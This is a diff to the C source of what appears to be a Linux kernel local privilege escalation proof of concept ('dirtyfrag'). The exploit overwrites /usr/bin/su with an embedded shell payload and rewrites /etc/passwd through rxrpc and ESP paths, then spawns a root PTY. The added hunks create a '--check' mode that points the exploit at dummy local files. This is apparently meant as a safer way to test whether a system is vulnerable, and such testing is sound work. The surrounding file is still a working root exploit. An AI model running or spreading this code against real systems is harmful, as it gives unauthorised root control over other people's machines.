@@ -88,6 +88,24 @@ static const uint8_t shell_elf[PAYLOAD_LEN] = {
 extern int g_su_verbose;
 int g_su_verbose = 0;
 #define SLOG(fmt, ...) do { if (g_su_verbose) fprintf(stderr, "[su] " fmt "\n", ##__VA_ARGS__); } while (0)
+#define LOG(fmt, ...) do { if (g_su_verbose) fprintf(stderr, "[su] " fmt "\n", ##__VA_ARGS__); } while (0)
+extern int g_check_only;
+int g_check_only = 0;
+
+void write_testfile(const char *path, const char *content, int length)
+{
+    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
+    if(fd == -1) {
+        LOG("open: %s", strerror(errno));
+        exit(1);
+    }
+    int ret = write(fd, content, length);
+    if(ret != length) {
+        LOG("write: %s", strerror(errno));
+        exit(1);
+    }
+    close(fd);
+}
 
 static int write_proc(const char *path, const char *buf)
 {
@@ -330,9 +348,17 @@ int su_lpe_main(int argc, char **argv)
 			; /* compat: this body always corrupts only */
 	}
 	if (getenv("DIRTYFRAG_VERBOSE")) g_su_verbose = 1;
+	if (getenv("DIRTYFRAG_CHECKONLY")) g_check_only = 1;
 
     const char *su_target_path = getenv("POC_SU_TARGET_FILE");
     if (!su_target_path || !*su_target_path) su_target_path = "/usr/bin/su";
+
+    // write test file
+    if(g_check_only) {
+        char a[PAYLOAD_LEN+20];
+        memset(a, 'A', sizeof(a));
+        write_testfile(su_target_path, a, sizeof(a));
+    }
 
 	pid_t cpid = fork();
 	if (cpid < 0) return 1;
@@ -451,6 +477,7 @@ static uint8_t SESSION_KEY[8] = {
 	0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
 };
 
+#undef LOG
 #define LOG(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
 #define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
 #define DBG(fmt, ...) fprintf(stderr, "[.] " fmt "\n", ##__VA_ARGS__)
@@ -1243,6 +1270,7 @@ int rxrpc_lpe_main(int argc, char **argv)
 			}
 		}
 	}
+	if (getenv("DIRTYFRAG_CHECKONLY")) g_check_only = 1;
 
 	/* Open a dummy AF_RXRPC socket to autoload the rxrpc kernel module.
 	 * Without this, the first add_key("rxrpc", ...) call fails with ENODEV
@@ -1262,6 +1290,12 @@ int rxrpc_lpe_main(int argc, char **argv)
 	 * root entry on line 1). */
 	const char *target_path = getenv("POC_TARGET_FILE");
 	if (!target_path || !*target_path) target_path = "/etc/passwd";
+
+    // write test file
+    if(g_check_only) {
+        const char *passwdstr = "root:x:0:0:root:/root:/bin/bash\n\n";
+        write_testfile(target_path, passwdstr, strlen(passwdstr));
+    }
 
 	int rfd_ro = open(target_path, O_RDONLY);
 	if (rfd_ro < 0) {
@@ -1894,8 +1928,33 @@ static int run_root_pty(void)
 	return 0;
 }
 
+void setenv_(const char *name, const char *value, int overwrite)
+{
+    int ret = setenv(name, value, overwrite);
+    if(ret == -1) {
+        LOG("setenv: %s", strerror(errno));
+        exit(1);
+    }
+}
+
 int main(int argc, char **argv)
 {
+    int check_only = (getenv("DIRTYFRAG_CHECKONLY") != NULL);
+    for (int i = 1; i < argc; i++) {
+        if (!strcmp(argv[i], "--check"))
+            check_only = 1;
+    }
+
+    if(check_only) {
+        setenv_("DIRTYFRAG_CHECKONLY", "1", 1);
+        setenv_("DIRTYFRAG_CORRUPT_ONLY", "1", 1);
+
+        const char *dirtyfrag_passwd = "dirtyfrag_passwd";
+        const char *dirtyfrag_su = "dirtyfrag_su";
+        setenv_("POC_TARGET_FILE", dirtyfrag_passwd, 1);
+        setenv_("POC_SU_TARGET_FILE", dirtyfrag_su, 1);
+    }
+
 	int verbose = (getenv("DIRTYFRAG_VERBOSE") != NULL);
     int co_flag = (getenv("DIRTYFRAG_CORRUPT_ONLY") != NULL);
 	int force_esp = 0, force_rxrpc = 0;
